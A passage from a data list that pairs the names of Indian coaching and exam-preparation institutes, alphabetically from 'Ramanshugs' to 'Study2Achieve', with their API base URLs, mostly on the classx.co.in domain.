        {"name": "Ramanshugs", "api": "https://ramanshugsclassesapi.classx.co.in"},
        {"name": "Ramasgurukul", "api": "https://ramasgurukulapi.classx.co.in"},
        {"name": "Rambanacademy", "api": "https://rambanacademyapi.classx.co.in"},
        {"name": "Ramdasshrikrushnawaghaakarupscmpsc", "api": "https://ramdasshrikrushnawaghapi.classx.co.in"},
        {"name": "Ramdevcareerclasses", "api": "https://ramdevcareerclassesapi.classx.co.in"},
        {"name": "Ramjikipathshala", "api": "https://ramjikipathshalaapi.classx.co.in"},
        {"name": "Ramnarayan", "api": "https://ramnarayanapi.classx.co.in"},
        {"name": "Ramnivassirmaths", "api": "https://ramnivassirmathsapi.classx.co.in"},
        {"name": "Ramsirstudy", "api": "https://ramsirstudyapi.classx.co.in"},
        {"name": "Ranjitmathematicsclasses", "api": "https://ranjitmathematicsclassesapi.classx.co.in"},
        {"name": "Rankers", "api": "https://rankersapi.appx.co.in"},
        {"name": "Rankers", "api": "https://rankersapi.classx.co.in"},
        {"name": "Rankersdefenceacademy", "api": "https://rankerdefenceapi.classx.co.in"},
        {"name": "Rankersiq", "api": "https://rankersiqapi.classx.co.in"},
        {"name": "Rankupeducation", "api": "https://rankupeducationapi.classx.co.in"},
        {"name": "Raoscareerinstitute", "api": "https://raocareerinstituteapi.classx.co.in"},
        {"name": "Rasbabadeepaksir", "api": "https://rasbabadeepaksirapi.classx.co.in"},
        {"name": "Rathodonlineacademy", "api": "https://rathodonlineacademyapi.classx.co.in"},
        {"name": "Rationalacademy", "api": "https://rationalacademyupapi.classx.co.in"},
        {"name": "Ratnaifoundation", "api": "https://ratnaifoundationapi.classx.co.in"},
        {"name": "Rattaeducation", "api": "https://rattaeducationapi.classx.co.in"},
        {"name": "Rautsiruniqueacademyyavatmal", "api": "https://rautsiruniqueacademyyavatmalapi.classx.co.in"},
        {"name": "Ravacademyformpscupsc", "api": "https://ravacademyapi.classx.co.in"},
        {"name": "Ravideduplus", "api": "https://ravideduplusapi.classx.co.in"},
        {"name": "Ravidfmaudiobooklearning", "api": "https://ravidfmaudiobooklearningapi.classx.co.in"},
        {"name": "Ravindrababuravula", "api": "https://ravindrababuravulaapi.classx.co.in"},
        {"name": "Ravinkipathshala", "api": "https://ravinpathshalaapi.classx.co.in"},
        {"name": "Rayalanandagopalonlineacademy", "api": "https://rayalanandagopalonlineacademyapi.classx.co.in"},
        {"name": "Rayatprabodhiniofficial", "api": "https://rayatprabodhiniofficialapi.classx.co.in"},
        {"name": "Rbe", "api": "https://revolutioneducationapi.teachx.in"},
        {"name": "Rcmathematics", "api": "https://rcmathematicsapi.classx.co.in"},
        {"name": "Rdmglobalstudies", "api": "https://rdmglobalstudiesapi.classx.co.in"},
        {"name": "Realknowledgeworld", "api": "https://realknowledgeworldapi.classx.co.in"},
        {"name": "Realstudy", "api": "https://realstudyapi.classx.co.in"},
        {"name": "Reasoningbypulkitsir", "api": "https://reasoningpulkitapi.classx.co.in"},
        {"name": "Reasoningbypuransir", "api": "https://reasoningpuransirapi.classx.co.in"},
        {"name": "Reasoningguru", "api": "https://reasoningguruapi.classx.co.in"},
        {"name": "Reasoninglife", "api": "https://reasoninglifeapi.classx.co.in"},
        {"name": "Reasoningrunway", "api": "https://reasoningrunwayrspailwarapi.classx.co.in"},
        {"name": "Reasoningwallah", "api": "https://reasoningwallahapi.classx.co.in"},
        {"name": "Recevaacademy", "api": "https://racevaacademyapi.classx.co.in"},
        {"name": "Reliableacademyhigher", "api": "https://reliableacademyhigherapi.classx.co.in"},
        {"name": "Reliableofficer", "api": "https://reliableofficerapi.classx.co.in"},
        {"name": "Resonanceias", "api": "https://resonanceiasapi.classx.co.in"},
        {"name": "Restartias", "api": "https://restartiasapi.classx.co.in"},
        {"name": "Resultguru", "api": "https://resultguruapi.classx.co.in"},
        {"name": "Resultmitra", "api": "https://resultmitraapi.classx.co.in"},
        {"name": "Revisersacademy", "api": "https://revisersacademyapi.classx.co.in"},
        {"name": "Revolutionbyeducation", "api": "https://revolutioneducationapi.classx.co.in"},
        {"name": "Rglectures", "api": "https://rglecturesapi.classx.co.in"},
        {"name": "Rgvikramjeet", "api": "https://rgvikramjeetapi.classx.co.in"},
        {"name": "Rhchemistry", "api": "https://rhchemistryapi.classx.co.in"},
        {"name": "Riseacademy", "api": "https://riseacademyapi.classx.co.in"},
        {"name": "Rishamamlearningcentre", "api": "https://rishamamlearningcentreapi.classx.co.in"},
        {"name": "Ritustudypoint", "api": "https://ritustudypointapi.classx.co.in"},
        {"name": "Rjcbtnursing", "api": "https://rjcbtnursingapi.classx.co.in"},
        {"name": "Rjinstitute", "api": "https://rjinstituteapi.classx.co.in"},
        {"name": "Rjstudypoint", "api": "https://rjstudypointapi.classx.co.in"},
        {"name": "Rkracademy", "api": "https://rkracademyapi.classx.co.in"},
        {"name": "Rksirenglish", "api": "https://rksirenglishapi.classx.co.in"},
        {"name": "Rksirofficial", "api": "https://rksirofficialapi.classx.co.in"},
        {"name": "Rktutorialofficial", "api": "https://rktutorialofficialapi.classx.co.in"},
        {"name": "Rlc", "api": "https://rlcapi.classx.co.in"},
        {"name": "Rmc", "api": "https://rmcapi.classx.co.in"},
        {"name": "Rmcprofithouse", "api": "https://rmcprofithouseapi.classx.co.in"},
        {"name": "Rnsstudies", "api": "https://rnsstudiesapi.classx.co.in"},
        {"name": "Robustlearning", "api": "https://robustlearningapi.classx.co.in"},
        {"name": "Rohitnegi", "api": "https://rohitnegiapi.classx.co.in"},
        {"name": "Rohitvaidwannotes", "api": "https://rohitvaidwannotesapi.classx.co.in"},
        {"name": "Rojgarrunwaycareerinstitute", "api": "https://rojgarrunwaycareerinstituteapi.classx.co.in"},
        {"name": "Rojgarsagar", "api": "https://rojgarsagarapi.classx.co.in"},
        {"name": "Rojgarsetu", "api": "https://rojgarsetuapi.classx.co.in"},
        {"name": "Rojgarwithankit", "api": "https://rozgarapinew.teachx.in"},
        {"name": "Rojgarwithsubhash", "api": "https://rojgarwithsubhashapi.classx.co.in"},
        {"name": "Roshangaurgsclasses", "api": "https://roshangaurgsclassesapi.classx.co.in"},
        {"name": "Roydsircareerhit", "api": "https://roydsircareerhitapi.classx.co.in"},
        {"name": "Rpconcept", "api": "https://rpconceptapi.classx.co.in"},
        {"name": "Rpscnotes", "api": "https://rpscnotesapi.classx.co.in"},
        {"name": "Rracademy", "api": "https://rracademyapi.classx.co.in"},
        {"name": "Rrcampus", "api": "https://rrcampusapi.classx.co.in"},
        {"name": "Rsbrailwayexams", "api": "https://rsbrailwayexamsapi.classx.co.in"},
        {"name": "Rsclasses", "api": "https://rsclassesapi.classx.co.in"},
        {"name": "Rslearningplatform", "api": "https://rslearningplatformapi.classx.co.in"},
        {"name": "Rssdigital", "api": "https://rssdigitalapi.classx.co.in"},
        {"name": "Rudraacademy", "api": "https://rudraacademyapi.classx.co.in"},
        {"name": "Rukminieducationcenter", "api": "https://rukminieducationcenterapi.classx.co.in"},
        {"name": "Rvmanushistudy", "api": "https://rvmanushistudyapi.classx.co.in"},
        {"name": "Saarthieducation", "api": "https://saarthieducationapi.classx.co.in"},
        {"name": "Saarthimentor", "api": "https://saarthimentorapi.classx.co.in"},
        {"name": "Saarthispk", "api": "https://saarthispkapi.classx.co.in"},
        {"name": "Sachin", "api": "https://sachinacademyapi.classx.co.in"},
        {"name": "Sachindhawalesmathsandreasoningacademy", "api": "https://sachindhawaleapi.classx.co.in"},
        {"name": "Sachingaikwadte", "api": "https://sachingaikwadteamapi.classx.co.in"},
        {"name": "Sachinwarulkar", "api": "https://sachinwarulkarapi.classx.co.in"},
        {"name": "Sadhyaacademy", "api": "https://sadhyaacademyapi.classx.co.in"},
        {"name": "Safalacademyforgpsc", "api": "https://safalacademyforgpscapi.classx.co.in"},
        {"name": "Safalsteps", "api": "https://safalstepsapi.classx.co.in"},
        {"name": "Safaltabyprashantsir", "api": "https://safaltaprashantsirapi.classx.co.in"},
        {"name": "Safaltaexpress", "api": "https://safaltaexpressapi.classx.co.in"},
        {"name": "Safaltamanthan247", "api": "https://safaltamanthan247api.classx.co.in"},
        {"name": "Safaltaschool", "api": "https://safaltaschoolapi.classx.co.in"},
        {"name": "Safaltatestseriesacademy", "api": "https://safaltatestseriesacademyapi.classx.co.in"},
        {"name": "Sagarcompetitiveacademy", "api": "https://sagarcompetitiveacademyapi.classx.co.in"},
        {"name": "Sagarmathematics", "api": "https://sagarmathematicsapi.classx.co.in"},
        {"name": "Sagarsindhuridlc", "api": "https://sagarsindhuridlcapi.classx.co.in"},
        {"name": "Sagaryadavmathsindore", "api": "https://sagaryadavmathsindoreapi.classx.co.in"},
        {"name": "Sahadevchoudhary", "api": "https://hindisahadevchoudharyapi.classx.co.in"},
        {"name": "Sahilsir", "api": "https://quicktrickssahilsirapi.classx.co.in"},
        {"name": "Sahityaacademy", "api": "https://sahityaacademyapi.classx.co.in"},
        {"name": "Sahityasangamonlineclasses", "api": "https://sahityasangamonlineclassesapi.classx.co.in"},
        {"name": "Sahityatheliterature", "api": "https://sahityatheliteratureapi.classx.co.in"},
        {"name": "Sahyadriacademybaramati", "api": "https://sahyadriacademybaramatiapi.classx.co.in"},
        {"name": "Sahyadriias", "api": "https://sahyadriiasapi.classx.co.in"},
        {"name": "Sahyadritestseriesbaramati", "api": "https://sahyadritestseriesbaramatiapi.classx.co.in"},
        {"name": "Saiacademy", "api": "https://saiacademyapi.classx.co.in"},
        {"name": "Saigangabooks", "api": "https://saigangaapi.classx.co.in"},
        {"name": "Saimedhaecet", "api": "https://saimedhaecetapi.classx.co.in"},
        {"name": "Saimedhagate", "api": "https://saimedhagateapi.classx.co.in"},
        {"name": "Saimedhajlm", "api": "https://saimedhajlmapi.classx.co.in"},
        {"name": "Saimedhaunity", "api": "https://saimedhaunityapi.classx.co.in"},
        {"name": "Sakarforum", "api": "https://sakarforumapi.classx.co.in"},
        {"name": "Salesforceandinterviews", "api": "https://salesforceandinterviewsapi.classx.co.in"},
        {"name": "Salesforcegeek", "api": "https://salesforcegeekapi.classx.co.in"},
        {"name": "Samadhankokate", "api": "https://samadhankokatepolityapi.classx.co.in"},
        {"name": "Samarthacademy", "api": "https://samarthacademyapi.classx.co.in"},
        {"name": "Samayak", "api": "https://samyakapi.teachx.in"},
        {"name": "Samikshainstitute", "api": "https://samikshainstituteapi.classx.co.in"},
        {"name": "Samyak", "api": "https://samyakapi.classx.co.in"},
        {"name": "Sandeepjyani", "api": "https://sandeepjyanicivilengineeringapi.classx.co.in"},
        {"name": "Sandeepsirclasses", "api": "https://sandeepsirclassesapi.classx.co.in"},
        {"name": "Sandeshwithravisir", "api": "https://sandeshravisirapi.classx.co.in"},
        {"name": "Sandipargadesinstitute", "api": "https://sandipargadeinstituteapi.classx.co.in"},
        {"name": "Sangarshparivar", "api": "https://sangharshparivarapi.classx.co.in"},
        {"name": "Sangharshacademyapppbn", "api": "https://sangharshacademyapppbnapi.classx.co.in"},
        {"name": "Sangharshindia", "api": "https://sangharshindiaapi.classx.co.in"},
        {"name": "Sanjaychemtutorial", "api": "https://sanjaychemtutorialapi.classx.co.in"},
        {"name": "Sanjaypahadesmathsreasoningacademy", "api": "https://sanjaypahademathsreasoningacademyapi.classx.co.in"},
        {"name": "Sanjayvighnefutureofficer", "api": "https://sanjayvighnefutureofficerapi.classx.co.in"},
        {"name": "Sanjeevkijani", "api": "https://sanjeevkijaniapi.classx.co.in"},
        {"name": "Sankalp", "api": "https://sankalpcoachingganganagarapi.classx.co.in"},
        {"name": "Sankalp", "api": "https://sankalpclassesapi.appx.co.in"},
        {"name": "Sankalp2447", "api": "https://sankalp2447api.classx.co.in"},
        {"name": "Sankalpacademy", "api": "https://sankalpacademyapi.classx.co.in"},
        {"name": "Sankalpclasses", "api": "https://sankalpclassesapi.classx.co.in"},
        {"name": "Sankalpclassesmsp", "api": "https://sankalpclassesmspapi.classx.co.in"},
        {"name": "Sankalptrinity", "api": "https://sankalptrinityapi.classx.co.in"},
        {"name": "Sanketsirgs", "api": "https://sanketsirgscentreapi.classx.co.in"},
        {"name": "Sankhokun", "api": "https://sankhokunapi.classx.co.in"},
        {"name": "Sanskritganga", "api": "https://sanskritganganewapi.classx.co.in"},
        {"name": "Sanskritsamriddhi", "api": "https://sanskritsamriddhiapi.appx.co.in"},
        {"name": "Sanskritsannidhyam", "api": "https://sanskritsannidhyamapi.classx.co.in"},
        {"name": "Sanskrutiaryagurukulam", "api": "https://sanskrutiaryagurukulamapi.classx.co.in"},
        {"name": "Santsirclasses", "api": "https://santsirclassesapi.classx.co.in"},
        {"name": "Saptrangnursecarrieracademy", "api": "https://saptrangnursecarrieracademyapi.classx.co.in"},
        {"name": "Saraakash", "api": "https://saraakashapi.classx.co.in"},
        {"name": "Saraswatacademy", "api": "https://saraswatacademyapi.classx.co.in"},
        {"name": "Sarkarigurukul", "api": "https://sarkarigurukulapi.classx.co.in"},
        {"name": "Sarkarimasterofficial", "api": "https://sarkarimasterofficialapi.classx.co.in"},
        {"name": "Sarkarinaukari", "api": "https://sarkarinaukariapi.classx.co.in"},
        {"name": "Sarkarinaukriwale", "api": "https://sarkarinaukriwaleapi.classx.co.in"},
        {"name": "Sarokarshikshansansthan", "api": "https://sarokarshikshansansthanapi.classx.co.in"},
        {"name": "Sartazclasses", "api": "https://sartazclassesapi.classx.co.in"},
        {"name": "Sarthakclassespaota", "api": "https://sarthakclassespaotaapi.classx.co.in"},
        {"name": "Sarthiacademyakns", "api": "https://sarthiacademyaknsapi.classx.co.in"},
        {"name": "Sarthidigitalclassroom", "api": "https://sarthidigitalclassroomapi.classx.co.in"},
        {"name": "Sarthisupportdigitalclass", "api": "https://sarthisupportdigitalclassapi.classx.co.in"},
        {"name": "Sarvodayaacademy", "api": "https://sarvodayaacademyschoolcompetitiveexamapi.classx.co.in"},
        {"name": "Sarvodayaacademyrajasthan", "api": "https://sarvodayaacademyrajasthanapi.classx.co.in"},
        {"name": "Sarvodayaonline", "api": "https://sarvodayaonlineapi.classx.co.in"},
        {"name": "Sateeshenglishmethodologylogics", "api": "https://sateeshenglishmethodologylogicsapi.classx.co.in"},
        {"name": "Satendrasiasacademy", "api": "https://satendraiasapi.classx.co.in"},
        {"name": "Satendrasir", "api": "https://satendrasirclassesapi.classx.co.in"},
        {"name": "Satishscienceacademy", "api": "https://satishscienceacademyapi.classx.co.in"},
        {"name": "Satvalearningapp", "api": "https://satvalearningappapi.classx.co.in"},
        {"name": "Satyadisharma", "api": "https://satyadhisharmaclassesapi.classx.co.in"},
        {"name": "Satyamclassesgorakhpur", "api": "https://satyamclassesgorakhpurapi.classx.co.in"},
        {"name": "Satyarthinstitute", "api": "https://satyarthinstituteapi.classx.co.in"},
        {"name": "Saurabhsirclasses", "api": "https://saurabhsirclassesapi.classx.co.in"},
        {"name": "Savarncoaching", "api": "https://savarncoachingapi.classx.co.in"},
        {"name": "Savijayiasdelhi", "api": "https://savijayiasapi.classx.co.in"},
        {"name": "Sbexamexamscrackapp", "api": "https://sbexamexamscrackappapi.classx.co.in"},
        {"name": "Sbsuccessbymallikarjunasir", "api": "https://sbsuccessbymallikarjunasirapi.classx.co.in"},
        {"name": "Sbsuccesspoint", "api": "https://sbsuccesspointapi.classx.co.in"},
        {"name": "Sbtechmathacademy", "api": "https://sbtechmathapi.classx.co.in"},
        {"name": "Scholarscareeracademy", "api": "https://scholarscareeracademyapi.classx.co.in"},
        {"name": "Schoolingmantra", "api": "https://schoolingmantraapi.classx.co.in"},
        {"name": "Scienceacademy", "api": "https://scienceacademyapi.classx.co.in"},
        {"name": "Scienceacademybyaarifsir", "api": "https://scienceacademyaarifsirapi.classx.co.in"},
        {"name": "Sciencebyanilkotle", "api": "https://scienceanilkotleapi.classx.co.in"},
        {"name": "Sciencebypriya", "api": "https://sciencepriyamaamapi.classx.co.in"},
        {"name": "Sciencefun", "api": "https://sciencefunapi.classx.co.in"},
        {"name": "Scienceplus", "api": "https://scienceplusapi.classx.co.in"},
        {"name": "Sciencesamrajya", "api": "https://sciencesamrajyaapi.classx.co.in"},
        {"name": "Sciencesangrah", "api": "https://sciencesangrahapi.classx.co.in"},
        {"name": "Sciencetechnologybydrsantosh", "api": "https://sciencetechnologydrsantoshapi.classx.co.in"},
        {"name": "Scmagnet", "api": "https://sciencemagnetapi.classx.co.in"},
        {"name": "Sctacademy", "api": "https://sctacademyapi.classx.co.in"},
        {"name": "Sdcampus", "api": "https://sdcampusapi.classx.co.in"},
        {"name": "Sdcareer", "api": "https://sdcareerapi.classx.co.in"},
        {"name": "Selection", "api": "https://selectionguruapi.classx.co.in"},
        {"name": "Selectionacademy", "api": "https://selectionacademyapi.classx.co.in"},
        {"name": "Selectionboardacademy", "api": "https://selectionboardacademyapi.classx.co.in"},
        {"name": "Selectionboardjaipur", "api": "https://selectionboardjaipurapi.classx.co.in"},
        {"name": "Selectiondarbar", "api": "https://selectiondarbarapi.classx.co.in"},
        {"name": "Selectiondunia", "api": "https://selectionduniaapi.classx.co.in"},
        {"name": "Selectiongurukul", "api": "https://selectiongurukulapi.classx.co.in"},
        {"name": "Selectionhub", "api": "https://selectionhubapi.classx.co.in"},
        {"name": "Selectionshala", "api": "https://selectionshalaapi.classx.co.in"},
        {"name": "Selectiontak", "api": "https://selectiontakapi.classx.co.in"},
        {"name": "Selectiontaknew", "api": "https://selectiontakmpapi.classx.co.in"},
        {"name": "Selectionwarrior", "api": "https://selectionwarriorapi.classx.co.in"},
        {"name": "Serenepathsala", "api": "https://serenepathshalaapi.classx.co.in"},
        {"name": "Sgacademy", "api": "https://sgacademyapi.classx.co.in"},
        {"name": "Sgcommerceclasses", "api": "https://sgcommerceclassesapi.classx.co.in"},
        {"name": "Shahidsirseducationpoint", "api": "https://shahidsirseducationpointapi.classx.co.in"},
        {"name": "Shaileshclasses", "api": "https://shaileshclassesapi.classx.co.in"},
        {"name": "Sharadcoachingclasses", "api": "https://sharadcoachingclassesapi.classx.co.in"},
        {"name": "Sharadsenglishclubpune", "api": "https://sharadsenglishclubpuneapi.classx.co.in"},
        {"name": "Shardaexam", "api": "https://shardaexamapi.classx.co.in"},
        {"name": "Shardeclassesnokha", "api": "https://shardeclassesnokhaapi.classx.co.in"},
        {"name": "Sharmaclassesjodhpurshikshaguru", "api": "https://sharmaclassesjodhpurapi.classx.co.in"},
        {"name": "Shashankdefenceacademy", "api": "https://shashankdefenceacademyapi.classx.co.in"},
        {"name": "Shikharclassroom", "api": "https://shikharclassroomapi.classx.co.in"},
        {"name": "Shikhareducation", "api": "https://shikhareducationapi.classx.co.in"},
        {"name": "Shikhareducationresearchcentre", "api": "https://shikhareducationresearchcentreapi.classx.co.in"},
        {"name": "Shikharsthelearningapp", "api": "https://shikharslearningapi.classx.co.in"},
        {"name": "Shiksha", "api": "https://shikshapathapi.classx.co.in"},
        {"name": "Shikshadham", "api": "https://shikshadhamdelhiapi.classx.co.in"},
        {"name": "Shikshadhamofficialwinning", "api": "https://shikshadhamofficialapi.classx.co.in"},
        {"name": "Shikshakul", "api": "https://shikshakulapi.classx.co.in"},
        {"name": "Shikshasamagam", "api": "https://shikshasamagamapi.classx.co.in"},
        {"name": "Shikshayuglive", "api": "https://shikshayugliveapi.classx.co.in"},
        {"name": "Shineindiagroupsacademy", "api": "https://shineindiagroupsacademyapi.classx.co.in"},
        {"name": "Shinusingh", "api": "https://shinusinghapi.classx.co.in"},
        {"name": "Shivaclassesbiharagriculture", "api": "https://shivaclassesbiharagricultureapi.classx.co.in"},
        {"name": "Shivajinimat", "api": "https://shivajinimatapi.classx.co.in"},
        {"name": "Shivcoachingclasses", "api": "https://shivcoachingclassesapi.classx.co.in"},
        {"name": "Shivikakipathshala", "api": "https://shivikakipathshalaapi.classx.co.in"},
        {"name": "Shivzmusic", "api": "https://shivzmusicapi.classx.co.in"},
        {"name": "Shomusbiology", "api": "https://shomusbiologyapi.classx.co.in"},
        {"name": "Shreeacademy", "api": "https://shreeacademyapi.classx.co.in"},
        {"name": "Shreebalajinursingacademy", "api": "https://shreebalajinursingacademyapi.classx.co.in"},
        {"name": "Shreeclasses", "api": "https://shreeclassesapi.classx.co.in"},
        {"name": "Shreeenglish", "api": "https://shreeenglishapi.classx.co.in"},
        {"name": "Shreeganeshclasses", "api": "https://shreeganeshclassesapi.classx.co.in"},
        {"name": "Shreejipratyekam", "api": "https://shreejipratyekamapi.classx.co.in"},
        {"name": "Shreejistudycentre", "api": "https://shreejistudycentreapi.classx.co.in"},
        {"name": "Shreejitraders", "api": "https://shreejitradersapi.classx.co.in"},
        {"name": "Shreeramclasses", "api": "https://shreeramclassesapi.classx.co.in"},
        {"name": "Shreeramedumitra", "api": "https://shreeramedumitraapi.classx.co.in"},
        {"name": "Shrenikjainengineeringsimplified", "api": "https://engineeringsimplifiedapi.classx.co.in"},
        {"name": "Shreshthclasses", "api": "https://shreshthclassesapi.classx.co.in"},
        {"name": "Shreyajeeacademy", "api": "https://shreyajeeacademyapi.classx.co.in"},
        {"name": "Shubhamclasses", "api": "https://shubhamclassesapi.classx.co.in"},
        {"name": "Shubhameclasses", "api": "https://shubhameclassesapi.classx.co.in"},
        {"name": "Shubhamjagdish", "api": "https://shubhamjagdishapi.classx.co.in"},
        {"name": "Shubhiasacademy", "api": "https://shubhiasacademyapi.classx.co.in"},
        {"name": "Shuklaclassesdelhi", "api": "https://shuklaclassesdelhiapi.classx.co.in"},
        {"name": "Siddhantuedutech", "api": "https://siddhantuedutechapi.classx.co.in"},
        {"name": "Sigmaacademybyhemant", "api": "https://sigmaacademyhemantapi.classx.co.in"},
        {"name": "Sigmaclassesedutube", "api": "https://sigmaclassesapi.classx.co.in"},
        {"name": "Sigmaias", "api": "https://sigmaiasapi.classx.co.in"},
        {"name": "Sikarclasses", "api": "https://sikarclassesapi.classx.co.in"},
        {"name": "Sikhwalonlinehubjaipur", "api": "https://sikhwalonlinehubapi.classx.co.in"},
        {"name": "Simplifysuccess", "api": "https://simplifysuccessapi.classx.co.in"},
        {"name": "Simplifyuppsc", "api": "https://simplifyuppscapi.classx.co.in"},
        {"name": "Simplifyupscmpsc", "api": "https://simplifyupscmpscapi.classx.co.in"},
        {"name": "Simsnapclinic", "api": "https://simsnapclinicapi.classx.co.in"},
        {"name": "Singhinusa", "api": "https://singhusaapi.classx.co.in"},
        {"name": "Singhkorieducation", "api": "https://singhkorieducationapi.classx.co.in"},
        {"name": "Singhsahab", "api": "https://singhsahabapi.classx.co.in"},
        {"name": "Sirodiatestseriesapp", "api": "https://sirodiatestseriesappapi.classx.co.in"},
        {"name": "Sitachoudharyhistory", "api": "https://sitachoudharyhistoryapi.classx.co.in"},
        {"name": "Sivapallipsychology", "api": "https://sivapallipsychologyapi.classx.co.in"},
        {"name": "Siwalclasses", "api": "https://siwalclassesapi.classx.co.in"},
        {"name": "Sjnacademy", "api": "https://sjnacademyapi.classx.co.in"},
        {"name": "Skanclasses", "api": "https://skanclassesapi.classx.co.in"},
        {"name": "Skclass", "api": "https://skclassappapi.classx.co.in"},
        {"name": "Skeducationlive", "api": "https://skeducationliveapi.classx.co.in"},
        {"name": "Skilladda", "api": "https://skilladdaapi.classx.co.in"},
        {"name": "Skillupacademy", "api": "https://skillupacademyapi.classx.co.in"},
        {"name": "Skilluptech", "api": "https://skilluptechapi.classx.co.in"},
        {"name": "Skillverse", "api": "https://skillverseapi.classx.co.in"},
        {"name": "Skmathreasoning", "api": "https://skmathreasoningapi.classx.co.in"},
        {"name": "Skmstudy", "api": "https://skmstudyapi.classx.co.in"},
        {"name": "Sknayakclasses", "api": "https://sknayakclassesapi.classx.co.in"},
        {"name": "Skpatelsiasacademy", "api": "https://skpatelsiasacademyapi.classx.co.in"},
        {"name": "Skpolity", "api": "https://skpolityapi.classx.co.in"},
        {"name": "Sksrivastava", "api": "https://sksrivastavaapi.classx.co.in"},
        {"name": "Skyeducare", "api": "https://skyeducareapi.classx.co.in"},
        {"name": "Smartbookstore", "api": "https://smartbookstoreapi.classx.co.in"},
        {"name": "Smarteducationcenter", "api": "https://smarteducationcenterapi.classx.co.in"},
        {"name": "Smartmpscwala", "api": "https://smartmpscwalaapi.classx.co.in"},
        {"name": "Smartnotes", "api": "https://smartnotesapi.classx.co.in"},
        {"name": "Smartrankers", "api": "https://smartrankersapi.classx.co.in"},
        {"name": "Smartstudyclassespro", "api": "https://smartstudyclassesproapi.classx.co.in"},
        {"name": "Smartstudyfoundation", "api": "https://smartstudyfoundationapi.classx.co.in"},
        {"name": "Smartstudyras", "api": "https://smartstudyrasapi.classx.co.in"},
        {"name": "Smbis", "api": "https://smbisapi.classx.co.in"},
        {"name": "Smsinstitute", "api": "https://smsinstituteapi.classx.co.in"},
        {"name": "Sneakclub", "api": "https://sneakclubapi.classx.co.in"},
        {"name": "Softstudy", "api": "https://softstudyapi.classx.co.in"},
        {"name": "Solusacademy", "api": "https://solusacademyapi.classx.co.in"},
        {"name": "Sonuarmyclasses", "api": "https://sonuarmyclassesapi.classx.co.in"},
        {"name": "Sonusirclasses", "api": "https://sonusirclassesapi.classx.co.in"},
        {"name": "Soonyaacademylearnerapp", "api": "https://soonyaacademylearnerapi.classx.co.in"},
        {"name": "Spaceclasses", "api": "https://spaceclassesapi.classx.co.in"},
        {"name": "Spaceias", "api": "https://spaceiasapi.teachx.in"},
        {"name": "Spaceiasacademy", "api": "https://spaceiasapi.classx.co.in"},
        {"name": "Spacetutor", "api": "https://spacetutorapi.classx.co.in"},
        {"name": "Spandanias", "api": "https://spandaniasapi.classx.co.in"},
        {"name": "Spaneducation", "api": "https://spaneducationapi.classx.co.in"},
        {"name": "Spardhagram", "api": "https://spardhagramapi.classx.co.in"},
        {"name": "Spardhalines", "api": "https://spardhalinesapi.classx.co.in"},
        {"name": "Spardhaniti", "api": "https://spardhanitiapi.classx.co.in"},
        {"name": "Spardhapariksha", "api": "https://spardhaparikshaapi.classx.co.in"},
        {"name": "Spardhaparikshaupdate", "api": "https://spardhaparikshaupdateapi.classx.co.in"},
        {"name": "Sparkleeducation", "api": "https://sparkleeducationapi.classx.co.in"},
        {"name": "Sparkleeducationwithgaurav", "api": "https://sparkleeducationgauravapi.classx.co.in"},
        {"name": "Speakfluentlyankushpare", "api": "https://speakfluentlyankushpareapi.classx.co.in"},
        {"name": "Speakingchalks", "api": "https://speakingchalksapi.classx.co.in"},
        {"name": "Spectrumacademy", "api": "https://spectrumacademyapi.classx.co.in"},
        {"name": "Speedycurrentaffairsgk", "api": "https://speedycurrentaffairsgkapi.classx.co.in"},
        {"name": "Speedystudy", "api": "https://speedstudyapi.classx.co.in"},
        {"name": "Spguruagriculture", "api": "https://spguruagricultureapi.classx.co.in"},
        {"name": "Spmiasacademy", "api": "https://spmiasacademyapi.classx.co.in"},
        {"name": "Squaredice", "api": "https://squarediceapi.classx.co.in"},
        {"name": "Sreedharsstudies", "api": "https://sreedharsstudiesapi.classx.co.in"},
        {"name": "Sricompetitiveforum", "api": "https://sricompetitiveforumapi.classx.co.in"},
        {"name": "Sridhi", "api": "https://sridhiapi.classx.co.in"},
        {"name": "Srigayatriteluguacademy", "api": "https://srigayatriteluguacademyapi.classx.co.in"},
        {"name": "Srihanacademyneetjee", "api": "https://srihanacademyapi.classx.co.in"},
        {"name": "Srinivasmech", "api": "https://srinivasmechapi.classx.co.in"},
        {"name": "Srisaiacademy", "api": "https://srisaiacademyapi.classx.co.in"},
        {"name": "Srisaitutorial", "api": "https://srisaitutorialapi.classx.co.in"},
        {"name": "Srisatyaacademy", "api": "https://srisatyaacademyapi.classx.co.in"},
        {"name": "Srishailinypublications", "api": "https://srishailinyapi.classx.co.in"},
        {"name": "Sristiedu", "api": "https://sristieduapi.classx.co.in"},
        {"name": "Srkt", "api": "https://srktacademyapi.teachx.in"},
        {"name": "Srktacademy", "api": "https://srktacademyapi.classx.co.in"},
        {"name": "Srmacademy", "api": "https://srmacademyapi.classx.co.in"},
        {"name": "Ss", "api": "https://sandsappapi.classx.co.in"},
        {"name": "Ssacademy", "api": "https://ssacademyapi.classx.co.in"},
        {"name": "Ssbguide", "api": "https://ssbguideapi.classx.co.in"},
        {"name": "Ssbworld", "api": "https://ssbworldapi.classx.co.in"},
        {"name": "Sscgurukul", "api": "https://ssggurukulapi.appx.co.in"},
        {"name": "Sschsczone", "api": "https://sschsczoneapi.classx.co.in"},
        {"name": "Sscmakerexampreparation", "api": "https://sscmakerexampreparationapi.classx.co.in"},
        {"name": "Ssctelugu", "api": "https://sscteluguapi.classx.co.in"},
        {"name": "Sspathshala", "api": "https://sspathshalaapi.classx.co.in"},
        {"name": "Ssrganeshtelugu", "api": "https://ssrganeshteluguapi.classx.co.in"},
        {"name": "Sstbyanupamsir", "api": "https://sstanupamsirapi.classx.co.in"},
        {"name": "Sstpoint", "api": "https://sstpointapi.classx.co.in"},
        {"name": "Stariqeducation", "api": "https://stariqeducationapi.classx.co.in"},
        {"name": "Starmathematics", "api": "https://starmathematicsapi.classx.co.in"},
        {"name": "Stashokparwar", "api": "https://sciencetechnologyenvironmentashokpawarapi.classx.co.in"},
        {"name": "Stbgofficial", "api": "https://stbgofficialapi.classx.co.in"},
        {"name": "Stenoshala", "api": "https://stenoshalaapi.classx.co"},
        {"name": "Stenoshala", "api": "https://stenoshalaapi.classx.co.in"},
        {"name": "Stenoshalalearnshorthand", "api": "https://stenoshalalearnshorthandeaseapi.classx.co.in"},
        {"name": "Stiravindramane", "api": "https://stiravindramaneapi.classx.co.in"},
        {"name": "Stockburner", "api": "https://stockburnerapi.classx.co.in"},
        {"name": "Studento", "api": "https://studentoapi.classx.co.in"},
        {"name": "Studentscampus", "api": "https://studentscampusapi.classx.co.in"},
        {"name": "Study2Achieve", "api": "https://study2achieveapi.classx.co.in"},
